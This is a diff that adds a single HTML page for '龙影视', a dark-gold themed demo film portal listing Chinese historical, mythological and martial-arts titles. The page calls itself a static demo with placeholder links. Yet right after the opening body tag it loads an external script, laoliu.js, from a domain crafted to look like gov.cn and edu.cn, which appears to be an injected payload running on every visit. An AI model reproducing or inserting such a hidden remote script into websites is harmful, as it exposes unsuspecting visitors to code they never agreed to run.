@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>龙影视 - 东方史诗放映厅·帝王将相/神话史诗/东方美学/动作巨制 | longyingshi-h5.github.io</title>
+<meta name="description" content="龙影视（longyingshi-h5.github.io）东方史诗放映厅：帝王将相、神话史诗、东方美学、动作巨制、武侠江湖、历史正剧一站聚合。帝王金+龙鳞青+朱砂红+墨黑，飞龙在天——东方叙事的恢弘与磅礴。移动端自适应，纯静态演示站。" />
+<meta name="keywords" content="龙影视,longyingshi-h5,东方史诗,帝王将相,神话,东方美学,动作巨制,武侠,历史正剧,大国气象" />
+<link rel="canonical" href="https://longyingshi-h5.github.io/" />
+<style>
+:root{
+  --gold:#D4A017;--darkgold:#8B6914;--scale:#1B4965;--vermilion:#C1121F;
+  --ink:#0A0A0A;--jade:#F0F0E8;--line:rgba(212,160,23,.35);--maxw:1180px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  font-family:"Noto Serif SC","Songti SC","STSong",serif;
+  background:var(--ink);color:var(--jade);line-height:1.85;-webkit-font-smoothing:antialiased;
+  overflow-x:hidden;min-height:100vh;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+
+/* 龙纹条 */
+.dragon-band{display:flex;height:5px}
+.dragon-band i{flex:1}
+.dragon-band i:nth-child(1){background:var(--ink)}
+.dragon-band i:nth-child(2){background:var(--gold)}
+.dragon-band i:nth-child(3){background:var(--vermilion)}
+.dragon-band i:nth-child(4){background:var(--scale)}
+.dragon-band i:nth-child(5){background:var(--darkgold)}
+.dragon-band i:nth-child(6){background:var(--gold)}
+.dragon-band i:nth-child(7){background:var(--ink)}
+
+/* 顶部 */
+header.site{position:sticky;top:0;z-index:60;background:rgba(10,10,10,.95);backdrop-filter:blur(12px);border-bottom:2px solid var(--gold)}
+.nav{display:flex;align-items:center;gap:12px;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:20px;letter-spacing:3px}
+.seal{width:40px;height:40px;border-radius:4px;background:linear-gradient(135deg,var(--gold),var(--vermilion));color:var(--ink);display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;font-family:serif;border:2px solid var(--gold);box-shadow:0 0 12px rgba(212,160,23,.4)}
+.logo small{display:block;font-size:9px;color:var(--darkgold);font-weight:600;letter-spacing:1px}
+.menu{margin-left:auto;display:flex;gap:3px}
+.menu a{padding:8px 13px;border-radius:4px;font-size:13px;font-weight:700;color:var(--jade)}
+.menu a:hover{background:var(--gold);color:var(--ink)}
+.search-min{display:flex;gap:6px}
+.search-min input{width:140px;padding:8px 12px;border-radius:4px;border:1.5px solid var(--line);background:var(--ink);outline:none;font-size:13px;color:var(--jade);font-family:serif}
+.search-min input::placeholder{color:var(--darkgold)}
+.search-min button{border:0;padding:8px 16px;border-radius:4px;cursor:pointer;font-weight:800;color:var(--ink);background:var(--gold);font-family:serif}
+.burger{display:none;margin-left:auto;border:1.5px solid var(--line);background:var(--ink);border-radius:4px;padding:6px 10px;font-size:16px;color:var(--gold)}
+
+/* Hero */
+.hero{margin:22px 0 8px;border-radius:0;border:3px double var(--gold);padding:60px 30px;text-align:center;position:relative;overflow:hidden;
+  background:radial-gradient(ellipse at 50% 30%,rgba(27,73,101,.3),transparent 70%),var(--ink)}
+.hero::before{content:"「 飛 龍 在 天 」";position:absolute;top:14px;left:50%;transform:translateX(-50%);font-size:11px;color:var(--darkgold);letter-spacing:12px;font-family:serif}
+.hero::after{content:"🐉";position:absolute;right:-10px;bottom:-20px;font-size:120px;opacity:.06;animation:dragonswim 8s ease-in-out infinite}
+@keyframes dragonswim{0%,100%{transform:translate(0,0) rotate(-5deg)}50%{transform:translate(-20px,-10px) rotate(5deg)}}
+.hero h1{font-size:44px;margin:0 0 8px;font-weight:900;letter-spacing:6px;position:relative;font-family:serif}
+.hero h1 em{font-style:normal;color:var(--gold)}
+.hero p{color:var(--darkgold);font-size:14px;margin:0 auto 22px;max-width:580px;line-height:1.95}
+.bigbar{display:flex;gap:8px;max-width:520px;margin:0 auto;background:var(--ink);border:2px solid var(--gold);border-radius:2px;padding:5px 5px 5px 16px}
+.bigbar input{flex:1;border:0;outline:none;font-size:14px;background:transparent;color:var(--jade);font-family:serif}
+.bigbar input::placeholder{color:var(--darkgold)}
+.bigbar button{border:0;padding:10px 22px;border-radius:2px;font-weight:900;cursor:pointer;color:var(--ink);background:linear-gradient(135deg,var(--gold),var(--vermilion));font-family:serif}
+.chips{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-top:18px}
+.chips a{font-size:12px;font-weight:700;padding:5px 14px;border-radius:2px;background:transparent;color:var(--gold);border:1px solid var(--line)}
+.chips a:hover{background:var(--gold);color:var(--ink)}
+
+/* 九宫格 */
+.nine-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin:26px 0}
+.grid-cell{background:var(--ink);border:2px solid var(--line);border-radius:0;padding:20px;transition:.25s;position:relative;overflow:hidden}
+.grid-cell::before{content:"";position:absolute;top:0;left:0;right:0;height:3px;background:var(--gold);transform:scaleX(0);transition:.3s}
+.grid-cell:hover::before{transform:scaleX(1)}
+.grid-cell:hover{border-color:var(--gold);box-shadow:0 0 24px rgba(212,160,23,.15)}
+.grid-cell .glyph{font-size:32px;margin-bottom:8px;display:block}
+.grid-cell:nth-child(1) .glyph{color:var(--vermilion)}
+.grid-cell:nth-child(2) .glyph{color:var(--scale)}
+.grid-cell:nth-child(3) .glyph{color:var(--gold)}
+.grid-cell:nth-child(4) .glyph{color:var(--darkgold)}
+.grid-cell:nth-child(5) .glyph{color:var(--vermilion)}
+.grid-cell:nth-child(6) .glyph{color:var(--scale)}
+.grid-cell:nth-child(7) .glyph{color:var(--gold)}
+.grid-cell:nth-child(8) .glyph{color:var(--darkgold)}
+.grid-cell:nth-child(9) .glyph{color:var(--vermilion)}
+.grid-cell h3{font-size:15px;margin:0 0 4px;font-weight:900;font-family:serif;letter-spacing:1px}
+.grid-cell p{font-size:11px;color:var(--darkgold);margin:0;line-height:1.6}
+
+/* 区块 */
+.section{padding:28px 0}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:18px;flex-wrap:wrap;border-left:5px solid var(--gold);padding-left:12px}
+.sec-head h2{font-size:20px;margin:0;font-weight:900;letter-spacing:2px;font-family:serif}
+.sec-head h2::before{content:"☯ ";}
+.sec-head h2 .b{color:var(--gold)}
+.sec-head span{color:var(--darkgold);font-size:12px}
+.more{margin-left:auto;color:var(--gold);font-size:12px;font-weight:800}
+
+/* 飞龙片带 */
+.dragon-rail{display:flex;gap:14px;overflow-x:auto;padding-bottom:10px;scroll-snap-type:x mandatory}
+.dragon-rail::-webkit-scrollbar{height:7px}
+.dragon-rail::-webkit-scrollbar-thumb{background:var(--gold);border-radius:0}
+.dcard{flex:0 0 230px;scroll-snap-align:start;background:var(--ink);border:2px solid var(--line);border-radius:0;overflow:hidden;transition:.2s}
+.dcard:hover{transform:translateY(-5px);border-color:var(--vermilion);box-shadow:0 10px 28px rgba(193,18,31,.25)}
+.dcard .frame{aspect-ratio:3/4;border-radius:0;display:flex;align-items:flex-end;padding:14px;position:relative}
+.dcard:nth-child(1) .frame{background:linear-gradient(160deg,#1a0a0a,#C1121F)}
+.dcard:nth-child(2) .frame{background:linear-gradient(160deg,#0a1a2a,#1B4965)}
+.dcard:nth-child(3) .frame{background:linear-gradient(160deg,#1a1a0a,#D4A017)}
+.dcard:nth-child(4) .frame{background:linear-gradient(160deg,#0a0a1a,#8B6914)}
+.dcard:nth-child(5) .frame{background:linear-gradient(160deg,#1a0a1a,#C1121F)}
+.dcard:nth-child(6) .frame{background:linear-gradient(160deg,#0a2a1a,#1B4965)}
+.dcard:nth-child(7) .frame{background:linear-gradient(160deg,#2a1a0a,#D4A017)}
+.dcard:nth-child(8) .frame{background:linear-gradient(160deg,#1a1a1a,#0A0A0A)}
+.dcard .frame h4{color:#fff;font-size:15px;font-weight:900;margin:0;width:100%;text-shadow:0 2px 6px rgba(0,0,0,.5);font-family:serif;letter-spacing:1px}
+.dcard .meta{padding:12px;background:var(--ink)}
+.dcard .meta p{font-size:11px;color:var(--darkgold);margin:0 0 6px;line-height:1.6}
+.dcard .meta .tag{display:inline-block;font-size:10px;padding:2px 8px;border-radius:0;background:rgba(212,160,23,.12);color:var(--gold);font-weight:700;margin-right:4px;border:1px solid var(--line)}
+
+/* 布局 */
+.layout{display:grid;grid-template-columns:1fr 310px;gap:22px}
+
+/* 帝王列传 */
+.epic-list{display:flex;flex-direction:column;gap:10px}
+.epic{display:flex;gap:12px;align-items:center;background:var(--ink);border:2px solid var(--line);padding:12px;transition:.2s}
+.epic:hover{border-color:var(--gold)}
+.epic .no{width:38px;height:38px;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:900;flex-shrink:0;background:var(--gold);color:var(--ink);font-family:serif}
+.epic:nth-child(1) .no{background:var(--vermilion);color:var(--jade)}
+.epic:nth-child(2) .no{background:var(--darkgold)}
+.epic:nth-child(3) .no{background:var(--scale);color:var(--jade)}
+.epic div{flex:1}
+.epic div h4{font-size:14px;margin:0 0 2px;font-weight:900;font-family:serif;letter-spacing:1px}
+.epic div span{font-size:10px;color:var(--darkgold)}
+.epic em{font-style:normal;font-size:11px;font-weight:800;color:var(--gold)}
+
+/* 侧栏 */
+.side-panel{background:var(--ink);border:2px solid var(--line);padding:18px;margin-bottom:16px}
+.side-panel h3{font-size:14px;margin:0 0 12px;font-weight:900;color:var(--gold);font-family:serif;letter-spacing:1px}
+.side-panel h3::before{content:"🐲 ";}
+.kin{display:flex;gap:10px;align-items:center;padding:9px 0;border-bottom:1px dashed var(--line)}
+.kin:last-child{border-bottom:0}
+.kin .ic{width:34px;height:34px;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0;background:var(--ink);border:1px solid var(--line)}
+.kin div{flex:1}
+.kin div h4{font-size:12px;margin:0;font-weight:800;font-family:serif}
+.kin div span{font-size:10px;color:var(--darkgold)}
+.kin em{font-style:normal;font-size:10px;font-weight:800;color:var(--vermilion)}
+
+/* FAQ */
+.faq{margin-top:8px}
+.qa{background:var(--ink);border:2px solid var(--line);padding:14px 16px;margin-bottom:10px}
+.qa h4{font-size:14px;margin:0 0 6px;font-weight:900;color:var(--gold);font-family:serif}
+.qa p{font-size:12px;color:var(--darkgold);margin:0;line-height:1.85}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:20px;margin-top:18px}
+.abox{background:var(--ink);border:2px solid var(--line);padding:22px}
+.abox h3{font-size:16px;margin:0 0 10px;font-weight:900;color:var(--gold);font-family:serif;letter-spacing:1px}
+.abox h3::before{content:"☯ ";}
+.abox p,.abox li{font-size:13px;color:var(--darkgold);line-height:1.9}
+.abox ul{padding-left:18px;margin:0}
+.stats{display:flex;gap:10px;margin-top:14px}
+.st{flex:1;text-align:center;background:var(--ink);border:2px solid var(--line);padding:12px}
+.st b{display:block;font-size:18px;color:var(--gold);font-weight:900;font-family:serif}
+.st span{font-size:10px;color:var(--darkgold)}
+
+footer.site{border-top:3px solid var(--gold);background:var(--ink);color:var(--darkgold);padding:28px 0 44px;font-size:12px;text-align:center}
+footer.site a{color:var(--gold)}
+footer.site .fl{font-size:20px;font-weight:900;color:var(--jade);margin-bottom:8px;letter-spacing:4px;font-family:serif}
+footer.site .fl span{color:var(--gold)}
+code{background:var(--ink);border:1px solid var(--line);padding:2px 6px;font-size:11px;color:var(--jade)}
+
+@media(max-width:980px){.layout{grid-template-columns:1fr}.nine-grid{grid-template-columns:repeat(2,1fr)}.about{grid-template-columns:1fr}}
+@media(max-width:720px){
+  .menu{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--ink);border-bottom:2px solid var(--gold);padding:10px 16px}
+  .menu.open{display:flex}.burger{display:block}.search-min input{width:80px}.hero h1{font-size:26px;letter-spacing:3px}
+  .nine-grid{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="dragon-band"><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="seal">龍</div>
+      <div>龙影视<small>longyingshi-h5.github.io</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">龙庭</a>
+      <a href="#epic">史诗</a>
+      <a href="#emperor">帝王</a>
+      <a href="#myth">神话</a>
+      <a href="#kungfu">动作</a>
+      <a href="#faq">FAQ</a>
+    </nav>
+    <div class="search-min">
+      <input type="text" placeholder="英雄 / 封神 / 大明王朝 / 叶问 / 卧虎藏龙 / 赤壁" />
+      <button onclick="alert('演示站：播放用 # 占位')">御览</button>
+    </div>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <h1><em>龙</em>影视</h1>
+    <p>龙——东方图腾，帝王气象，力量与祥瑞，飞龙在天。<br/>龙影视不做小情小调，只做<strong>东方叙事的恢弘与磅礴</strong>：帝王将相、神话史诗、东方美学、动作巨制、武侠江湖、历史正剧。<br/>大国气象，一屏尽收。</p>
+    <div class="bigbar">
+      <input type="text" placeholder="> 御览：帝王 / 神话 / 武侠 / 史诗 / 动作 / 正剧" />
+      <button onclick="alert('演示站：结果用 # 占位')">出征</button>
+    </div>
+    <div class="chips">
+      <a href="#epic">东方史诗</a>
+      <a href="#emperor">帝王将相</a>
+      <a href="#myth">神话志异</a>
+      <a href="#kungfu">动作巨制</a>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="sec-head"><h2><span class="b">东方</span>九宫 · 九类气象</h2><span>nine.genres</span><a class="more" href="#">更多 #</a></div>
+    <div class="nine-grid">
+      <div class="grid-cell"><span class="glyph">👑</span><h3>帝王将相</h3><p>秦皇汉武、唐宗宋祖，权力之巅的人性</p></div>
+      <div class="grid-cell"><span class="glyph">🐉</span><h3>神话史诗</h3><p>封神、西游、白蛇，中国神话宇宙</p></div>
+      <div class="grid-cell"><span class="glyph">🏯</span><h3>历史正剧</h3><p>大明王朝、雍正王朝，台词都是教科书</p></div>
+      <div class="grid-cell"><span class="glyph">⚔</span><h3>武侠江湖</h3><p>金庸古龙温瑞安，刀光剑影侠客行</p></div>
+      <div class="grid-cell"><span class="glyph">🎭</span><h3>宫斗权谋</h3><p>甄嬛传、延禧攻略，后宫如战场</p></div>
+      <div class="grid-cell"><span class="glyph">🏹</span><h3>战争史诗</h3><p>赤壁、长津湖，千军万马的恢弘</p></div>
+      <div class="grid-cell"><span class="glyph">🥋</span><h3>动作巨制</h3><p>叶问、杀破狼，拳拳到肉的真功夫</p></div>
+      <div class="grid-cell"><span class="glyph">🎨</span><h3>东方美学</h3><p>卧虎藏龙、英雄，色彩与构图的盛宴</p></div>
+      <div class="grid-cell"><span class="glyph">🌾</span><h3>年代史诗</h3><p>白鹿原、活着，一个大时代的小人物</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="epic">
+    <div class="sec-head"><h2><span class="b">飞龙</span>在天 · 史诗片带</h2><span>epic.scroll</span><a class="more" href="#">更多 #</a></div>
+    <div class="dragon-rail">
+      <div class="dcard"><div class="frame"><h4>英雄</h4></div><div class="meta"><p>张艺谋的色彩史诗。无名、残剑、飞雪，书法与剑法的共振</p><span class="tag">史诗</span><span class="tag">8.1分</span></div></div>
+      <div class="dcard"><div class="frame"><h4>赤壁</h4></div><div class="meta"><p>三国最大战役。梁朝伟的周瑜，金城武的诸葛亮</p><span class="tag">战争</span><span class="tag">7.4分</span></div></div>
+      <div class="dcard"><div class="frame"><h4>封神三部曲</h4></div><div class="meta"><p>中国神话宇宙的起点。质子旅、妲己、通天教主</p><span class="tag">神话</span><span class="tag">7.7分</span></div></div>
+      <div class="dcard"><div class="frame"><h4>大明王朝1566</h4></div><div class="meta"><p>46集权谋剧巅峰。海瑞骂皇帝那段看十遍</p><span class="tag">正剧</span><span class="tag">9.7分</span></div></div>
+      <div class="dcard"><div class="frame"><h4>卧虎藏龙</h4></div><div class="meta"><p>竹林打斗如舞蹈。东方美学的世界名片</p><span class="tag">武侠</span><span class="tag">8.7分</span></div></div>
+      <div class="dcard"><div class="frame"><h4>白鹿原</h4></div><div class="meta"><p>白嘉轩、鹿子霖，一部关中平原的史诗</p><span class="tag">年代</span><span class="tag">8.8分</span></div></div>
+      <div class="dcard"><div class="frame"><h4>叶问 4</h4></div><div class="meta"><p>甄子丹收官之作。中国功夫 vs 西洋拳</p><span class="tag">动作</span><span class="tag">7.1分</span></div></div>
+      <div class="dcard"><div class="frame"><h4>活着</h4></div><div class="meta"><p>福贵一生，一个时代的缩影。张艺谋最克制的作品</p><span class="tag">年代</span><span class="tag">9.3分</span></div></div>
+    </div>
+  </section>
+
+  <div class="layout">
+    <div>
+      <section class="section" id="emperor">
+        <div class="sec-head"><h2><span class="b">帝王</span>将相 · 权力之巅</h2><span>emperor.chronicle</span><a class="more" href="#">更多 #</a></div>
+        <div class="epic-list">
+          <div class="epic"><div class="no">一</div><div><h4>大明王朝1566</h4><span>海瑞 · 嘉靖 · 严嵩，46集权谋教科书</span></div><em>9.7</em></div>
+          <div class="epic"><div class="no">二</div><div><h4>雍正王朝</h4><span>唐国强封神演绎，九子夺嫡看得心惊</span></div><em>9.4</em></div>
+          <div class="epic"><div class="no">三</div><div><h4>康熙王朝</h4><span>陈道明演活千古一帝，从少年到暮年</span></div><em>9.2</em></div>
+          <div class="epic"><div class="no">四</div><div><h4>汉武大帝</h4><span>犯我强汉者，虽远必诛</span></div><em>9.1</em></div>
+          <div class="epic"><div class="no">五</div><div><h4>大秦帝国 系列</h4><span>商鞅变法到始皇一统，秦的崛起全纪录</span></div><em>9.3</em></div>
+          <div class="epic"><div class="no">六</div><div><h4>贞观之治</h4><span>马跃演李世民，文治武功的盛世图景</span></div><em>9.2</em></div>
+        </div>
+      </section>
+
+      <section class="section" id="myth">
+        <div class="sec-head"><h2><span class="b">神话</span>志异 · 东方奇幻</h2><span>myth.scroll</span><a class="more" href="#">更多 #</a></div>
+        <div class="epic-list">
+          <div class="epic"><div class="no">一</div><div><h4>封神演义（剧版）</h4><span>神仙打架、人伦纠葛、王朝更替</span></div><em>7.7</em></div>
+          <div class="epic"><div class="no">二</div><div><h4>西游记 86版</h4><span>六小龄童，几代人的童年记忆</span></div><em>9.6</em></div>
+          <div class="epic"><div class="no">三</div><div><h4>白蛇：缘起</h4><span>追光动画国风美学，白蛇传前传</span></div><em>7.9</em></div>
+          <div class="epic"><div class="no">四</div><div><h4>捉妖记</h4><span>胡巴萌化，中国奇幻商业片标杆</span></div><em>6.8</em></div>
+          <div class="epic"><div class="no">五</div><div><h4>哪吒闹海（动画）</h4><span>上美影经典，中国动画的黄金年代</span></div><em>9.0</em></div>
+          <div class="epic"><div class="no">六</div><div><h4>钟馗伏魔</h4><span>东方驱魔人，钟馗捉鬼的视觉奇观</span></div><em>5.7</em></div>
+        </div>
+      </section>
+
+      <section class="section" id="faq">
+        <div class="sec-head"><h2><span class="b">常见</span>问题</h2><span>faq</span></div>
+        <div class="faq">
+          <div class="qa"><h4>龙影视是影视资源站吗？</h4><p>不是。纯静态演示站，所有链接 <code>#</code> 占位，不提供任何真实盗版资源。"龙"取东方图腾、大国气象、帝王将相之意。</p></div>
+          <div class="qa"><h4>为什么专做东方题材？</h4><p>因为东方叙事有自己独特的美学体系：帝王权谋的克制、武侠江湖的浪漫、神话志异的想象、年代史诗的厚度——这些是西方片给不了的。龙影视把这些集中呈现。</p></div>
+          <div class="qa"><h4>"东方九宫"是哪九类？</h4><p>帝王将相、神话史诗、历史正剧、武侠江湖、宫斗权谋、战争史诗、动作巨制、东方美学、年代史诗——覆盖东方叙事的全部光谱。</p></div>
+          <div class="qa"><h4>移动端体验如何？</h4><p>响应式布局、无横滚、点击区域够大，必应移动端索引友好。</p></div>
+        </div>
+      </section>
+    </div>
+
+    <aside>
+      <div class="side-panel">
+        <h3>龙之九子</h3>
+        <div class="kin"><div class="ic">🐲</div><div><h4>囚牛 · 好音</h4><span>帝王将相，权谋之音</span></div><em>一</em></div>
+        <div class="kin"><div class="ic">🐲</div><div><h4>睚眦 · 好杀</h4><span>武侠江湖，刀剑之争</span></div><em>二</em></div>
+        <div class="kin"><div class="ic">🐲</div><div><h4>嘲风 · 好险</h4><span>战争史诗，千军万马</span></div><em>三</em></div>
+        <div class="kin"><div class="ic">🐲</div><div><h4>蒲牢 · 好鸣</h4><span>历史正剧，振聋发聩</span></div><em>四</em></div>
+        <div class="kin"><div class="ic">🐲</div><div><h4>狻猊 · 好坐</h4><span>宫斗权谋，静观其变</span></div><em>五</em></div>
+        <div class="kin"><div class="ic">🐲</div><div><h4>霸下 · 好负重</h4><span>年代史诗，承载时代</span></div><em>六</em></div>
+        <div class="kin"><div class="ic">🐲</div><div><h4>狴犴 · 好讼</h4><span>神话志异，天庭审判</span></div><em>七</em></div>
+        <div class="kin"><div class="ic">🐲</div><div><h4>负屃 · 好文</h4><span>东方美学，笔墨丹青</span></div><em>八</em></div>
+        <div class="kin"><div class="ic">🐲</div><div><h4>螭吻 · 好吞</h4><span>动作巨制，一口吞下</span></div><em>九</em></div>
+      </div>
+      <div class="side-panel">
+        <h3>御览排期</h3>
+        <div style="font-size:12px;color:var(--darkgold);line-height:2.2">
+          🐉 初一：帝王将相<br/>
+          🐉 初二：武侠江湖<br/>
+          🐉 初三：神话志异<br/>
+          🐉 初四：战争史诗<br/>
+          🐉 初五：动作巨制<br/>
+          🐉 初六：东方美学<br/>
+          🐉 初七：年代史诗<br/>
+          🐉 初八：历史正剧<br/>
+          🐉 初九：飞龙在天（自选）
+        </div>
+      </div>
+    </aside>
+  </div>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于 龙影视</h2><span>about</span></div>
+    <div class="about">
+      <div class="abox">
+        <h3>龙影视是什么？</h3>
+        <p><strong>龙影视（longyingshi-h5）</strong>——"龙"是东方图腾、帝王气象、力量与祥瑞。这台站不做小情小调，只做<strong>东方叙事的恢弘与磅礴</strong>。</p>
+        <p>帝王将相的权力之巅、神话志异的瑰丽想象、历史正剧的厚重克制、武侠江湖的浪漫侠义、战争史诗的千军万马、动作巨制的拳拳到肉、东方美学的色彩盛宴、年代史诗的时代缩影——龙之九子，各有所好。</p>
+        <p>配色用帝王金+龙鳞青+朱砂红+墨黑，像故宫的朱墙金瓦、龙袍的织金绣银——东方，就是要有东方自己的颜色。</p>
+        <div class="stats">
+          <div class="st"><b>9</b><span>东方九宫</span></div>
+          <div class="st"><b>8类</b><span>帝王/神话/正剧/武侠/宫斗/战争/动作/年代</span></div>
+          <div class="st"><b>0</b><span>西方大片</span></div>
+          <div class="st"><b>100%</b><span>移动端</span></div>
+        </div>
+      </div>
+      <div class="abox">
+        <h3>demo.note</h3>
+        <ul>
+          <li>纯静态单页，无后端、无真实视频源</li>
+          <li>所有链接均为 <code>#</code> 占位</li>
+          <li>与任何"龙影视"旧站无隶属，仅取"东方图腾·大国气象"概念</li>
+          <li>必应收录友好：唯一 H1、canonical、description 完整</li>
+          <li>帝王金+龙鳞青+朱砂红+墨黑 = 东方帝王风</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    <div class="fl">龍<span>影视</span></div>
+    ☯ 龙影视 --host longyingshi-h5.github.io<br/>
+    演示页面：所有链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 龙影视 Demo · 飞龙在天，东方气象 ☯
+  </div>
+</footer>
+
+<script>
+  const b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.onclick=()=>m.classList.toggle('open');
+  m.querySelectorAll('a').forEach(a=>a.onclick=()=>m.classList.remove('open'));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+</script>
+</body>
+</html>
